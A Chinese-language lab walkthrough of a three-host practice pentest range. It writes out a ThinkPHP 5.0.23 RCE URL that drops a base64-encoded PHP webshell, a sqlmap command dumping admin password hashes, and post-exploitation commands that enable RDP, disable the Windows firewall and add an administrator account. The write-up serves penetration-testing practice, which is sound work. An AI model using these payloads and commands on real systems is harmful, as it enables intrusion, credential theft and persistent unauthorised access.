此时渗透采用网上靶场的在线环境http://www.cloud-pentest.cn/

![image-20231201103247683](images/1.png)

# 信息收集

连接VPN后，对给的网段进行信息收集

![image-20231201103446239](images/2.png)

找到了主机172.25.0.13，并且发现了thinkphp漏洞

![image-20231201103433565](images/3.png)

# Target1

## Getshell

在第一步收集到主机信息并且发现thinkphp漏洞后，我们就可以尝试去利用thinkphp的漏洞进行rce了

直接用5.0.23rce的payload进行攻击

![image-20231201104718020](images/4.png)

然后尝试getshell

![image-20231201104742976](images/5.png)

去写入一个文件

```
http://172.25.0.13/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo PD9waHAKZXZhbCgkX1BPU1RbMV0pOw==|base64 -d>shell.php
```

![image-20231201104916595](images/6.png)

可以看到已经成功写入了，直接用蚁剑连接

![image-20231201105046053](images/7.png)

将会话转到msf上

![image-20231201105514461](images/8.png)

## socks代理

仍然用stowaway来起一个代理

![image-20231201110438031](images/9.png)

在这台机器上发现了另外一张网卡

![image-20231201110541023](images/10.png)

是192.168.22.0/24这个网段

![image-20231201110614981](images/11.png)

用fscan扫描后发现了另外一个ip为192.168.22.22，开启了80端口

挂上代理后访问到内网另外一台机器

![image-20231201110806285](images/12.png)

# Target2

## Getshell

通过代理访问到内网，发现是BageCMS3.1

<img src="images/31.png" alt="image-20231201111211155" style="zoom:50%;" />

通过dirsearch发现了robots.txt文件

![image-20231201111251897](images/13.png)

看到了一个后台登陆的地址，访问后跳转到后台登陆

![image-20231201111314187](images/14.png)

在网上搜了一圈，发现这个cms又很多漏洞，但是基本上都是后台漏洞，这里扫描到后台登陆路由了，应该可以去想办法登陆后台，通过后台的漏洞来RCE，不过弱口令尝试无果，前台也没有一个sql注入的历史漏洞去获取密码。

最后看wp，原来在index.php的网页源代码中给了hint，有一个注入点

![image-20231201111908004](images/15.png)

直接用sqlmap探测试试

![image-20231201115259092](images/16.png)

直接联合注入就拿到了数据库，接下来试试能不能在数据库里面通过sql注入拿到一些敏感内容，例如账号密码

```
sqlmap -u "http://192.168.22.22/index.php?r=vul&keyword=1" -D bagecms -T bage_admin -C password --dump --batch
```

![image-20231201115505077](images/17.png)

最后得到了admin的密码的md5，sqlmap也直接给出了md5点值，其实也是弱口令，当时因为有验证码就没有去跑字典里，只尝试了几个常见的弱口令

接下来成功登陆后台

![image-20231201115634043](images/18.png)

在后台的模板处

![image-20231201133840685](images/19.png)

可以自己创建模板文件夹，并且编辑php文件，直接来修改tag的index.php文件

![image-20231201134827415](images/20.png)

直接向里面写入一句话木马

![image-20231201134921450](images/21.png)

直接用蚁剑连接了

## socks代理

![image-20231201135816511](images/22.png)

在对网卡进行收集的时候，发现了内网的另外一个网段，处于192.168.33.22/24，继续用stowaway代理出来

# Target3

## Getshell

在挂上socks代理后，上传fscan进行一波收集

![image-20231201140602259](images/23.png)

找到了最后一台机器192.168.33.33，并且存在ms17-010，可以直接用msf打，直接添加全局代理，就不添加路由了

```
msf6 > setg Proxies socks5:127.0.0.1:8888
msf6 > setg ReverseAllowProxy true
```

因为是内网，记得打msf的时候用bind_tcp

![image-20231201141359854](images/24.png)

而且这台windows就是一台单独的windows也没有后续环境，也没有域环境

![image-20231201142129178](images/25.png)

最后在桌面找到flag

![image-20231201142816047](images/26.png)

## 开启远程桌面

![image-20231201141442272](images/27.png)

不知道是本来开了3389还是公网环境的问题，这里看的时候就已经开了3389了

### 利用msf

如果没有开可以用meterpreter开启远程桌面`run post/windows/manage/enable_rdp`

![image-20231201141735224](images/28.png)

这里显示RDP已经开了

### 手动开启

手动去开启3389端口

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

如果要手动关闭的话则把上面的0换成1

```
关闭防火墙
netsh firewall set opmode disable   			#winsows server 2003 之前
netsh advfirewall set allprofiles state off 	#winsows server 2003 之后


或者让防火墙对3389端口放行
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

## 添加账户远程连接

```
net user username password /add
net localgroup Administrators username /add
```

![image-20231201142436777](images/29.png)

![image-20231201142510229](images/30.png)



# 写在最后

这次靶机没有什么难度，感觉都是一些常见的漏洞，也没有域，横向也只是一些MS17-010这种漏洞，主要是对代理练习吧，都是一些常见的流程，后续还是对域环境的靶机看看吧。





参考链接：

http://www.cloud-pentest.cn/

https://www.cnblogs.com/1vxyz/p/17080748.html